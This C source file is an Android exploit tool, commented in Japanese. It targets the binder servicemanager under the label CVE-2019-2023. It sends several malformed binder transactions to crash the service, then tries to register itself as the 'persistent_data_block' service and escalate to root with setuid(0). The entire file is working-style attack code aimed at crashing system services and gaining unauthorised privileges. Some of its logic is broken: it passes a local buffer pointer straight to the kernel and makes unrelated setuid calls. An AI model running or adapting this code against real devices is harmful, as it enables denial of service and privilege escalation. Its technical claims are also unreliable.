#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/stat.h>
#include <time.h>
#include <pthread.h>
#include "binder.h"

// ============================================================
// 設定
// ============================================================
#define OUTPUT_FILE    "/data/local/tmp/servicemanager_exploit.txt"
#define LOG_FILE       "/data/local/tmp/servicemanager_traffic.log"
#define SHELL_PATH     "/system/bin/sh"
#define TARGET_SERVICE "persistent_data_block"   // 攻撃対象サービス（system_server が使う）

static volatile int g_exploit_success = 0;
static pid_t g_servicemanager_pid = 0;

// ============================================================
// ユーティリティ
// ============================================================
static void log_msg(const char *msg) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (fp) {
        fprintf(fp, "[%ld] %s\n", time(NULL), msg);
        fclose(fp);
    }
}

static pid_t get_servicemanager_pid(void) {
    FILE *fp = popen("pidof servicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) return -1;
    return pid;
}

// ============================================================
// servicemanager 向け CVE-2019-2023 クラッシュ（GET_SERVICE）
// ============================================================
static int crash_servicemanager_get_service(void) {
    int binder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = TARGET_SERVICE;
    size_t name_len = strlen(service_name) + 1;

    // パーセルにサービス名だけを入れ、インターフェース記述子を入れない（NULL 参照を誘発）
    // 通常の正しいパーセルは [インターフェース名][サービス名] だが、ここではサービス名だけ
    size_t total_len = 4 + name_len; // 最初の 4 バイトはサービス名の長さ
    uint8_t *data = malloc(total_len);
    if (!data) return -1;

    // サービス名の長さをリトルエンディアンでセット
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        free(data);
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;            // context manager
    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;  // 応答を読まない（ブロック防止）
    bwr.read_buffer = 0;

    printf("[*] Sending malformed GET_SERVICE to servicemanager...\n");
    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(binder_fd);

    if (ret < 0) {
        perror("  ioctl");
        return -1;
    }
    log_msg("Malformed GET_SERVICE sent");
    printf("  [+] GET_SERVICE sent (may have crashed servicemanager)\n");
    return 0;
}

// ============================================================
// servicemanager 向け ADD_SERVICE による乗っ取り（任意サービス登録）
// ============================================================
static int hijack_servicemanager_add_service(const char *service_name) {
    int binder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data = malloc(total_len);
    if (!data) return -1;

    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        free(data);
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    printf("[*] Attempting to register '%s' via ADD_SERVICE...\n", service_name);
    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(binder_fd);
        return -1;
    }

    // 応答からハンドルを取得（サービス登録成功時は BR_OK など）
    uint32_t *reply = (uint32_t*)read_buf;
    if (bwr.read_consumed >= 4 && reply[0] == BR_OK) {
        printf("  [+] ADD_SERVICE succeeded!\n");
        close(binder_fd);
        return 0;
    } else {
        printf("  [-] ADD_SERVICE failed or permission denied\n");
        close(binder_fd);
        return -1;
    }
}

// ============================================================
// クラッシュベクター：巨大サービス名（servicemanager 向け）
// ============================================================
static int crash_with_huge_name_servicemanager(void) {
    printf("[*] Trying crash with 8KB service name on servicemanager...\n");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';
    // ADD_SERVICE を送信（巨大名でクラッシュを狙う）
    int ret = hijack_servicemanager_add_service(payload);
    free(payload);
    return ret;
}

// ============================================================
// クラッシュベクター：無効なオフセット（servicemanager 向け）
// ============================================================
static int crash_with_invalid_offsets_servicemanager(void) {
    printf("[*] Sending malformed transaction with invalid offsets to servicemanager...\n");
    int binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open");
        return -1;
    }

    uint8_t *data = malloc(4096);
    if (!data) { close(binder_fd); return -1; }
    memset(data, 0x41, 4096);

    binder_size_t offsets[10];
    for (int i = 0; i < 10; i++) {
        offsets[i] = 8192 + i * 8; // 範囲外
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = sizeof(offsets);
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(binder_fd);
    if (ret < 0) {
        perror("  ioctl");
        return -1;
    }
    printf("  [+] Malformed transaction sent.\n");
    return 0;
}

// ============================================================
// クラッシュベクター：NULL バッファ
// ============================================================
static int crash_with_null_buffer_servicemanager(void) {
    printf("[*] Trying crash with NULL buffer pointer on servicemanager...\n");
    int binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open");
        return -1;
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 1024;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0; // NULL
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    close(binder_fd);
    if (ret < 0) {
        perror("  ioctl");
        return -1;
    }
    printf("  [+] NULL buffer transaction sent.\n");
    return 0;
}

// ============================================================
// クラッシュ監視と再起動待ち
// ============================================================
static int wait_for_servicemanager_restart(pid_t old_pid, int timeout_sec) {
    printf("[*] Waiting for servicemanager to restart (up to %d sec)...\n", timeout_sec);
    while (timeout_sec-- > 0) {
        pid_t new_pid = get_servicemanager_pid();
        if (new_pid > 0 && new_pid != old_pid) {
            printf("[+] servicemanager restarted with PID %d\n", new_pid);
            g_servicemanager_pid = new_pid;
            return 0;
        }
        sleep(1);
    }
    printf("[-] servicemanager did not restart within timeout\n");
    return -1;
}

// ============================================================
// メイン（servicemanager 特化）
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  servicemanager Exploit - Crash & Hijack (No System Reboot)\n");
    printf("============================================================\n\n");

    // ログ初期化
    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) {
        fprintf(fp, "=== servicemanager Exploit Log ===\n");
        fclose(fp);
        printf("[+] Log file created: %s\n", LOG_FILE);
    }

    // servicemanager PID 取得
    g_servicemanager_pid = get_servicemanager_pid();
    if (g_servicemanager_pid <= 0) {
        printf("[-] Could not find servicemanager. Trying anyway...\n");
    } else {
        printf("[+] Current servicemanager PID: %d\n", g_servicemanager_pid);
    }

    // フェーズ1: クラッシュ攻撃（複数ベクター）
    printf("[*] Phase 1: Crash servicemanager with multiple vectors\n");
    int crashed = 0;
    for (int i = 0; i < 3; i++) {  // 最大3回試行（再起動が多すぎないように）
        printf("[*] Attempt %d\n", i+1);

        // 不正な GET_SERVICE
        if (crash_servicemanager_get_service() == 0) {
            // クラッシュしたか確認
            pid_t new_pid = get_servicemanager_pid();
            if (new_pid != g_servicemanager_pid && new_pid > 0) {
                printf("[+] servicemanager crashed (PID changed)\n");
                crashed = 1;
                break;
            }
        }
        usleep(200000);

        // 巨大名 ADD_SERVICE
        crash_with_huge_name_servicemanager();
        usleep(200000);

        // 無効オフセット
        crash_with_invalid_offsets_servicemanager();
        usleep(200000);

        // NULL バッファ
        crash_with_null_buffer_servicemanager();
        usleep(200000);

        // クラッシュ確認
        pid_t new_pid = get_servicemanager_pid();
        if (new_pid != g_servicemanager_pid && new_pid > 0) {
            printf("[+] servicemanager crashed (PID changed)\n");
            crashed = 1;
            break;
        }
    }

    if (crashed) {
        // 再起動を待つ
        wait_for_servicemanager_restart(g_servicemanager_pid, 10);
    } else {
        printf("[-] servicemanager did not crash. Continuing...\n");
    }

    // フェーズ2: サービス乗っ取り（ADD_SERVICE）を試行
    printf("[*] Phase 2: Attempt to hijack service '%s'\n", TARGET_SERVICE);
    if (hijack_servicemanager_add_service(TARGET_SERVICE) == 0) {
        printf("[+] Successfully hijacked '%s'\n", TARGET_SERVICE);
        // ここで特権コマンド実行を試みる（setuid など）
        if (setuid(0) == 0) {
            printf("[+] setuid(0) succeeded! Executing id...\n");
            system("id > " OUTPUT_FILE " 2>&1");
            system("cat " OUTPUT_FILE);
            g_exploit_success = 1;
        } else if (setresuid(0,0,0) == 0) {
            printf("[+] setresuid(0,0,0) succeeded!\n");
            system("id > " OUTPUT_FILE " 2>&1");
            system("cat " OUTPUT_FILE);
            g_exploit_success = 1;
        } else {
            printf("[-] setuid failed. Trying fallback...\n");
        }
    }

    // フェーズ3: フォールバック（古典的 setuid）
    if (!g_exploit_success) {
        printf("[*] Phase 3: Fallback setuid(0)\n");
        if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
            printf("[+] Fallback succeeded!\n");
            system("id > " OUTPUT_FILE " 2>&1");
            system("cat " OUTPUT_FILE);
            g_exploit_success = 1;
        }
    }

    // 結果表示
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");

    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    return g_exploit_success ? 0 : 1;
}
